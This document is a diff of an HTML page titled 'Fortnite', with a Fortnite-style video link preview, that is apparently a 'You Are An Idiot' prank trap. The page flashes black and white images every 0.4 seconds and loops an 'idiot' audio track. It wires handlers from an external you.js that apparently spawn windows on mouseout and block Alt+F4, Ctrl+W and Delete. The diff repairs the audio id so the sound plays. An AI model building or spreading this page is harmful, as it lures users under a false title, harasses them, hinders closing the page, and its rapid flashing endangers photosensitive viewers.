@@ -1,97 +1,83 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <title>Fortnite</title>
-        <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
+<html lang="en">
+<head>
+    <title>Fortnite</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <!-- Open Graph meta tags for link preview -->
-        <meta property="og:video" content="ms.mp4"> <!-- URL to the video you want to display as a preview -->
+    <meta property="og:video" content="ms.mp4"> <!-- URL to the video you want to display as a preview -->
 
-    audio {
-      display: none; /* Hide the audio player */
-    }
-            @keyframes img-1 {
-                0% {
-                    opacity: 1;
-                }
-                44% {
-                    opacity: 1;
-                }
-                50% {
-                    opacity: 0;
-                }
-                94% {
-                    opacity: 0;
-                }
-                100% {
-                    opacity: 1;
-                }
-            }
-            @keyframes img-2 {
-                0% {
-                    opacity: 0;
-                }
-                44% {
-                    opacity: 0;
-                }
-                50% {
-                    opacity: 1;
-                }
-                94% {
-                    opacity: 1;
-                }
-                100% {
-                    opacity: 0;
-                }
-            }
-            .wrapper {
-                margin-left: 16.5% !important;
-                position: relative;
-                height: 100%;
-                width: 68%;
-            }
-            .wrapper img:first-child {
-                position: absolute;
-                width: 100%;
+    <style>
+        audio {
+            display: none; /* Hide the audio player */
+        }
+
+        @keyframes img-1 {
+            0%, 100% {
                 opacity: 1;
-                animation: img-1 0.4s infinite;  
             }
-
-            .wrapper img:last-child {
-                position: absolute;
-                width: 100%;
+            50% {
                 opacity: 0;
-                animation: img-2 0.4s infinite;
             }
+        }
 
-            body {
-                user-select: none;
+        @keyframes img-2 {
+            0%, 100% {
+                opacity: 0;
             }
-        </style>
-        <script src="you.js"></script>
-    </head>
-    <body onload="flagRun=1;playBall();return true;bookmark();" onkeydown="altf4key();ctrlwkey();delkey();" onmouseout="procreate();" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
-        <div class="wrapper">
-            <img src="black.png">
-            <img src="white.png">
-        </div>
-        <audio autoplay loop>
-  <source src="idiotmp3.mp3" type="audio/mpeg">
-  Your browser does not support the audio element.
-</audio>
-        <script>
-            var audio = document.getElementById("IdiotAudio");
-            audio.autoplay = true
-        </script>
-        <script>
-            audio.loop = true;
-            document.addEventListener('click', function() {
-              if (audio.paused) {
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .wrapper {
+            margin-left: 16.5% !important;
+            position: relative;
+            height: 100%;
+            width: 68%;
+        }
+
+        .wrapper img:first-child {
+            position: absolute;
+            width: 100%;
+            opacity: 1;
+            animation: img-1 0.4s infinite;
+        }
+
+        .wrapper img:last-child {
+            position: absolute;
+            width: 100%;
+            opacity: 0;
+            animation: img-2 0.4s infinite;
+        }
+
+        body {
+            user-select: none;
+        }
+    </style>
+    <script src="you.js"></script>
+</head>
+<body onload="flagRun=1;playBall();return true;bookmark();" onkeydown="altf4key();ctrlwkey();delkey();" onmouseout="procreate();" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+    <div class="wrapper">
+        <img src="black.png">
+        <img src="white.png">
+    </div>
+    <audio id="IdiotAudio" autoplay loop>
+        <source src="idiotmp3.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <script>
+        var audio = document.getElementById("IdiotAudio");
+        audio.autoplay = true;
+        audio.loop = true;
+
+        document.addEventListener('click', function() {
+            if (audio.paused) {
                 audio.play();
-              }
-            });
-        </script>
-    </body>
+            }
+        });
+    </script>
+</body>
 </html>
